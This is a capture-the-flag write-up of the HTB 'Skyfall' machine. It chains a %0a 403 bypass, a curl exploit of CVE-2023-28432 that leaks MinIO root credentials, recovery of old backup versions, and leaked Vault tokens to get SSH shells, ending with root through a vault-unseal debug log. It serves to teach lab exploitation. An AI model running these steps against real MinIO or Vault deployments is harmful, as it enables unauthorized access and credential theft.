# Machine Overview
  
Skyfall is an Insane machine on HTB that involves bypassing a 403 error and accessing the minio metrics page, then exploiting CVE-2023-28432 to gain the **minio_root_user** and **minio_root_password**. These credentials can be used to access the minio storage through the minio client as a root user. From minio, we found a **VAULT token** and a **Vault path**, which leads us to gain initial access as the **askyy** user. For privilege escalation, we leverage the debug feature of **vault-unseal**, which leaks the root user token and path to Vault. We then follow the same method to gain a shell as root as we used to get the askyy shell.

## Scanning with nmap
  
First of all, we will go with Nmap to scan the whole network and check for services running on the network. To scan the entire network and find all the open ports, I use **-p-** to scan all **65535** ports with **--min-rate 10000** to scan the network faster using **nmap**. After scanning, I retrieve a list of open ports on the network and extract only the open ports using various terminal tools like **cut**, **tr**, etc.

```bash
$ nmap -p- --min-rate 10000 10.10.11.254 -oN ini.txt && cat ini.txt | cut  -d ' ' -f1 | tr -d '/tcp' | tr '\n' ','
# Open ports
22,80
```

Now Let's run the depth scan on these specific ports using 

```bash
$ nmap -p22,80 -sC -sV -A -T4 10.10.11.254 -oN scan.txt
```

- **-sC** is to run all the default scripts
- **-sV** for service and version detection
- **-A** to check all default things
- **-T4** for aggressive scan
- **-oN** to write the result into a specified file

```bash
PORT   STATE SERVICE VERSION

```

## Information Gathering

Through Nmap, we discovered only two ports are open. On Port **22**, SSH version **8.9p1** is running on an Ubuntu system, and on port **80**, HTTP **Nginx 1.18.0** is running. The title of the webpage is "_Introducing Sky Storage!_". Both versions of SSH and Nginx are not vulnerable, so I decided to directly visit the webpage. Let's add `skyfall.htb` in our DNS file.

```bash
$ echo "10.10.11.254   skyfall.htb" | sudo tee -a /etc/hosts
```

### 80 HTTP

The webpage is running the SKYFALL website, which deals in data management and Sky Storage, with different pages linked on the **navbar**.

![Pasted image 20240207170725](https://github.com/iammR0OT/HTB/assets/74102381/2d1566e0-2996-470d-8104-4f3e928adbec)

All the links lead to the same page, which is our main page, and we found nothing interesting there except a subdomain called `demo.skyfall.htb` present on the demo section. Let's also add this to our local DNS file.

![Pasted image 20240207171019](https://github.com/iammR0OT/HTB/assets/74102381/3c9865f4-8c83-43df-b386-5e5aaaaf7255)
  
Let's move to the `demo.skyfall.htb` website and see what is there. A simple login page is running, and demo login credentials are provided to us on the page top. So, we can log into the webpage using the demo credentials.

![Pasted image 20240207171547](https://github.com/iammR0OT/HTB/assets/74102381/3e577c9e-0f7a-42c4-9802-bcfe7d638703)
  
After logging in using the demo credentials, the website redirects us to the index page. This is a **Sky Storage** Dashboard, where we can upload and download our files.

![Pasted image 20240207171832](https://github.com/iammR0OT/HTB/assets/74102381/5466282c-968d-4ef9-baa1-5e344501676a)

#### Tech Stack

We couldn't find any useful information there.

```r
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Tue, 06 Feb 2024 12:06:46 GMT
Content-Type: text/html

Connection: keep-alive
ETag: W/"654d44a7-5097"
Content-Encoding: gzip
```

We didn't find any useful information there, so I decided to view the source code of the web page, and from there, I discovered that the backend is using **Flask**, a Python framework.

```python
<div class="copyright text-center text-sm text-muted text-lg-start">
&copy; <a class="font-weight-bold">Sky Storage</a>
Powered by Flask.
</div>
```

### MinIO

On the Sky Storage Dashboard, I discovered a **MinIO Metrics** page.

MinIO is an open-source **object storage server** that is compatible with the **Amazon S3** cloud storage service. It allows users to store unstructured data such as **photos**, **videos**, **log** **files**, **backups**, and other types of large **binary** or **text** objects. MinIO is designed to be **lightweight**, **scalable**, and **highly available**, making it suitable for a wide range of use cases from small businesses to large enterprises. It is written in **Go** programming language and can run on a variety of platforms including Linux, macOS, and Windows. MinIO supports features like **erasure coding**, **data encryption**, and **multi-tenancy**, making it a versatile solution for building private or public cloud storage infrastructure.

![Pasted image 20240207172231](https://github.com/iammR0OT/HTB/assets/74102381/00537833-e6a4-483f-b0d6-cad492aa950f)
  
But the **MinIO Metrics** page is returning a 403 Forbidden error. However, I really want to see the content inside it. I tried different 403 bypass techniques, and the **CRLF** technique works, which involves adding `%0a` at the end of the file name.

![Pasted image 20240207173308](https://github.com/iammR0OT/HTB/assets/74102381/acc2f16c-41d4-4742-b398-abf25847ad4f)

![Pasted image 20240207173402](https://github.com/iammR0OT/HTB/assets/74102381/86d9cd95-8a0e-4901-8d1d-281f2f233438)

At the very last entry point, I discovered the **minio_endpoint_url** which is:
`http://prd23-s3-backend.skyfall.htb/minio/v2/metrics/cluster`. 

![Pasted image 20240206181506](https://github.com/iammR0OT/HTB/assets/74102381/d594175c-4e78-4f66-83fe-10b6d27a6fd1)

Let's also add this to our local DNS file and check what is present on that MinIO endpoint. There is numerical data about the performance and health of systems and applications present, which is scraped from HTTP endpoints. I went through all the data but didn't find anything interesting there.

![Pasted image 20240207173947](https://github.com/iammR0OT/HTB/assets/74102381/c2055108-3743-46f2-8c8d-9584175b0749)

After finding nothing from that endpoint, I searched for recent CVEs related to **MinIO** on Google and found one **Information Disclosure Vulnerability** known as `CVE-2023-28432` in MinIO. This vulnerability affects the `minio/bootstrap/v1/verify` endpoint, which leaks all environment variables, including **MINIO_SECRET_KEY** and **MINIO_ROOT_PASSWORD**. The vulnerable code is located in the **VerifyHandler** function in the **bootstrap-peer-server.go** file of the MinIO source code. Exploiting this vulnerability could allow an attacker to access and manipulate data stored in the MinIO cluster without proper authorization. [Reference](https://www.pingsafe.com/blog/cve-2023-28432-minio-information-disclosure-vulnerability/)

#### Exploiting CVE-2023-28432

When I tried to access the `minio/v2/metrics/cluster` path, it threw an error "AllAccessDisabled". Strange. So, I decided to use **cURL** instead.
##### cURL

**cURL** is a command-line tool used to interact with the web through the terminal.

```bash
$ curl -i -s -k -X $'POST' \
    -H $'Host: prd23-s3-backend.skyfall.htb' -H $'User-Agent: curl/8.5.0' -H $'Accept: /' -H $'Content-Length: 2' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Connection: close' \
    --data-binary $'{}' \
    $'http://prd23-s3-backend.skyfall.htb/minio/bootstrap/v1/verify'

MINIO_ROOT_PASSWORD : GkpjkmiVmpFuL2d3oRx0
```

Now that we have both the **root_user** and **root_password**, I found on the MinIO user management page that the root user has access to all actions and resources on the deployment. So, for management purposes, we need **mc** (which is the MinIO client used to interact with the MinIO server remotely). [Reference](https://min.io/docs/minio/linux/administration/identity-access-management/minio-user-management.html)

You can download **mc** using the following command: [Reference](https://github.com/minio/mc#gnulinux)

```bash
$ wget https://dl.min.io/client/mc/release/linux-amd64/mc
chmod +x mc
./mc --help
```

On the same page, it is written that we can create an alias with **MinIO Cloud Storage** using `mc alias` by providing the user secret and secret key, and we have both in our case for the root user. [Reference](https://github.com/minio/mc?tab=readme-ov-file#example---minio-cloud-storage)
### Listing Content of MinIO using mc

So, let's access the **MinIO Cloud Storage** using **mc**. You can get the list of all **mc** commands from [here](https://min.io/docs/minio/linux/reference/minio-mc.html).

```bash 
$ ./mc alias set minio http://prd23-s3-backend.skyfall.htb 5GrE1B2YGGyZzNHZaIww GkpjkmiVmpFuL2d3oRx0

Added `minio` successfully.
```

Now Lets list the content.

```bash
$ ./mc ls minio
[2023-11-07 23:59:15 EST]     0B askyy/
[2023-11-07 23:58:56 EST]     0B btanner/
[2023-11-07 23:58:33 EST]     0B emoneypenny/
[2023-11-07 23:58:22 EST]     0B gmallory/
[2023-11-07 19:08:01 EST]     0B guest/
[2023-11-07 23:59:05 EST]     0B jbond/
[2023-11-07 23:58:10 EST]     0B omansfield/
[2023-11-07 23:58:45 EST]     0B rsilva/
```

And we can see we have a list of users. Let's access the content of each user to see if we can find any useful data from it. All the other users have only one same file, **welcome.pdf**, except the **askyy** user, who has a **home_backup.tar.gz** file in its storage.

```bash
$ ./mc ls minio/askyy 
[2023-11-08 00:35:28 EST]  48KiB STANDARD Welcome.pdf
[2023-11-09 16:37:25 EST] 2.5KiB STANDARD home_backup.tar.gz
```
  
Let's download it using the `mc cp` command. It will download the file from the MinIO server to our local file system.

```bash
$ ./mc cp minio/askyy/home_backup.tar.gz .
..._backup.tar.gz: 2.48 KiB / 2.48 KiB 
```
 
The file has been downloaded successfully. Let's extract the contents from it using the **gunzip** and **tar** utilities of Linux.

```
$ gunzip home_backup.tar.gz 
$ tar -xvf home_backup.tar 
./
./.profile
./.bashrc
./.ssh/
./.ssh/authorized_keys
./.sudo_as_admin_successful
./.bash_history
./.bash_logout
./.cache/
./.cache/motd.legal-displayed
```
  
After going through all these files, I didn't find anything useful and moved back to the documentation of the **mc client**. There, I found a command called **undo**, which reverses changes due to either a **PUT** or **DELETE** operation at a specified path. There, I noticed that the size of the file `home_backup.tar.gz` increased from 2.5KB to 2.6KB. Let's download this one to our local filesystem using **cp**. I tried once more, and the size of the file increased from 2.6KB to 1.2MB. Let's download this one as well.

```bash 
$ ./mc undo  minio/askyy --recursive --force
✓ Last upload of `askyy/Welcome.pdf` (vid=bba1fcc2-331d-41d4-845b-0887152f19ec) is reverted.
✓ Last upload of `askyy/home_backup.tar.gz` (vid=25835695-5e73-4c13-82f7-30fd2da2cf61) is reverted.

$ ./mc ls minio/askyy                       
[2023-11-09 16:37:09 EST] 2.6KiB STANDARD home_backup.tar.gz

$ ./mc cp myminio/askyy/home_backup.tar.gz .  
..._backup.tar.gz: 2.64 KiB / 2.64 KiB

$ ./mc ls myminio/askyy                       
[2023-11-09 16:36:30 EST] 1.2MiB STANDARD home_backup.tar.gz
```

After that, I extracted all the files and created a folder for each one so that I can analyze the data and measure the difference between all of them. I used **grep** to find different patterns in all the files recursively.

```bash
$ grep -rni -e "Password" -e "User" -e "API" -e "Token" -e "SSH" -e "askyy"
```

- **-r** for recursive
- **-n** for line number
- **-i** for case insensitive 
- **-e** to take each word as saperate word

![Pasted image 20240207202925](https://github.com/iammR0OT/HTB/assets/74102381/5412fdcd-cd5f-46c0-a581-1a8dcae7a96e)

![Pasted image 20240207202946](https://github.com/iammR0OT/HTB/assets/74102381/eb3165c7-cd5d-4132-9782-63e725aa14e8)

Here, I found three interesting things: **VAULT_API_DIR**, **VAULT_TOKEN**, and **id_rsa** for the **askyy** user. I tried to log in using the **id_rsa** key, but it didn't work. I also tried to crack the key of **id_rsa** using **John**, but that also didn't work.

### Vault
  
When **id_rsa** didn't work, I moved to the **VAULT**. I Googled Vault and found the very first link describing Vault as an identity-based secrets and encryption management system. Vault works on tokens. In our case, we have both **VAULT_API_DIR** and the **VAULT_TOKEN**. [Reference](https://developer.hashicorp.com/vault/docs/what-is-vault)

You can download Vault from [here](https://developer.hashicorp.com/vault/install). Let's look at the help section of Vault. We can read and write, delete, list secrets.

![Pasted image 20240207205358](https://github.com/iammR0OT/HTB/assets/74102381/2dd8c3c8-daf5-4e52-9bb5-1382550fe022)
  
Now, let's connect to Vault using the token we got before. [Reference](https://developer.hashicorp.com/vault/tutorials/getting-started/getting-started-dev-server#set-environment-variables) First, export the **vault address** in an environmental variable. This will configure the Vault client to talk to the dev server. Then, export the Vault Token in another environmental variable. After setting both values, check the server status to see if it is running or not.

```bash
$ export VAULT_ADDR="http://prd23-vault-internal.skyfall.htb"
$ export VAULT_TOKEN="hvs.CAESIJlU9JMYEhOPYv4igdhm9PnZDrabYTobQ4Ymnlq1qY-LGh4KHGh2cy43OVRNMnZhakZDRlZGdGVzN09xYkxTQVE"
$ ./vault status
```
  
And Vault is connected successfully.

![Pasted image 20240207203804](https://github.com/iammR0OT/HTB/assets/74102381/d2c2c072-71f7-4c55-9823-977ddd16ce4f)
  
After going through the documentation of Vault, I discovered a page named **One-Time SSH Password**.
#### One-Time SSH Passwords
  
The **One-Time SSH Password** (OTP) SSH secrets engine type allows a Vault server to issue a **One-Time Password** every time a client wants to **SSH** into a remote host using a helper command on the remote host to perform verification. [Reference](https://developer.hashicorp.com/vault/docs/secrets/ssh/one-time-ssh-passwords)
  
To mount the secrets engine to our Vault so that we can request for **OTP** and login through SSH, we need to perform the following steps:
```
$ ./vault secrets enable ssh
Success! Enabled the ssh secrets engine at: ssh/
```
 
Let's first list the SSH roles in our current Vault.

```bash
$ ./vault list ssh/roles
Keys
----
admin_otp_key_role
dev_otp_key_role
```

We found two `ssh/roles` in Vault. Let's create an SSH session. 
- admin_otp_key_role
- dev_otp_key_role
## Shell as askyy
  
I tried to create an SSH session through the `admin_otp_key_role`, but it didn't work here. So, I moved to `dev_otp_key_role`.

```bash
$ ./vault ssh -role dev_otp_key_role -mode otp askyy@10.10.11.254
```
  
I got a shell as the **askyy** user.

![Pasted image 20240207211234](https://github.com/iammR0OT/HTB/assets/74102381/7cb8a244-af62-44d3-b9b3-be430ee67d43)

# Privilege Escalation

I ran `sudo -l` to check if there is any program the **askyy** user can run on behalf of the root user, and it turns out that **askyy** can run **vault-unseal**. 

![Pasted image 20240207211608](https://github.com/iammR0OT/HTB/assets/74102381/c93bec98-90ac-4a54-8a4b-e6717112e1b9)

When I go to the GitHub page of **vault-unseal**, it shows me four options. [Reference](https://github.com/lrstanley/vault-unseal?tab=readme-ov-file#gear-usage)
- **-v** for version detection
- **-l** for long path
- **-c** for configuration file path
- **-h** for help
 
But on our tool's page, it shows **-d**, which is not documented on the official page of **vault-unseal**. So, I asked ChatGPT about this option, and it says that **-d** is mostly used for debugging purposes in different command-line tools. So, I ran **vault-unseal** with **-d** and noticed that it creates a **debug.log** file in the current working directory. When I tried to access it, it said "permission denied."

![Pasted image 20240207214700](https://github.com/iammR0OT/HTB/assets/74102381/dc05ce39-fe01-4d5b-a7ff-c06a5d8a9cac)
  
Then, I created a file with the name **debug.log** so that next time when **vault-unseal** tries to save the debug content, it will save in our file. This way, we can read it.

![Pasted image 20240207215109](https://github.com/iammR0OT/HTB/assets/74102381/74a4cf3b-1b05-471c-ad48-49e7caaca27a)
  
And we found the TOKEN of the root user and the PATH. Let's try to access the Vault of the root account. The process will be the same, just we will access the **admin_otp_key_path** instead of the **dev_otp_key_path**.

```bash
$ export VAULT_ADDR="http://prd23-vault-internal.skyfall.htb"
$ export VAULT_TOKEN="hvs.I0ewVsmaKU1SwVZAKR3T0mmG"
$ ./vault status
```

```bash
./vault ssh -role admin_otp_key_role -mode otp root@10.10.11.254
```

![Pasted image 20240207215929](https://github.com/iammR0OT/HTB/assets/74102381/dd72a91c-affb-4661-aa53-6e492e3c72b6)
